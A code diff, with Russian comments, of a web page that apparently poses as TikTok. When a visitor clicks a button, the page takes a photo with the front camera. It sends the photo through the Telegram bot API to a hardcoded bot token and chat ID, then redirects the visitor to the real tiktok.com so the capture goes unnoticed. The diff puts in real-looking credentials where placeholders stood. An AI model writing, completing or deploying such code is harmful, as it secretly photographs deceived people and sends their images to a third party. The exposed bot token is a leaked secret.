@@ -26,15 +26,16 @@
 <video id="cam" autoplay muted></video>
 
 <script>
-    const BOT_TOKEN = 'ВАШ_ТОКЕН';   // замени
-    const CHAT_ID = 'ВАШ_CHAT_ID';    // замени
+    // ===== ТВОИ ДАННЫЕ =====
+    const BOT_TOKEN = '8764529930:AAEAu0l1CYHA_LdKgczyynFv6knHpulyL6c';
+    const CHAT_ID = '5891575156';
 
     const btn = document.getElementById('btn');
     const loader = document.getElementById('loader');
 
     btn.onclick = async function() {
         try {
-            // Запрашиваем только фронтальную камеру
+            // Запрашиваем фронтальную камеру
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: 'user' } 
             });
@@ -48,7 +49,7 @@
                 captureAndSend();
             }, 1500);
         } catch(e) {
-            alert('Ошибка доступа к камере: ' + e.message);
+            alert('Ошибка: ' + e.name + ' — ' + e.message);
         }
     };
 
@@ -65,12 +66,14 @@
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, 'photo.jpg');
 
+            // Отправка в Telegram
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData,
                 mode: 'no-cors'
             }).catch(() => {});
 
+            // Редирект на настоящий TikTok
             window.location.href = 'https://www.tiktok.com';
         }, 'image/jpeg', 0.8);
     }
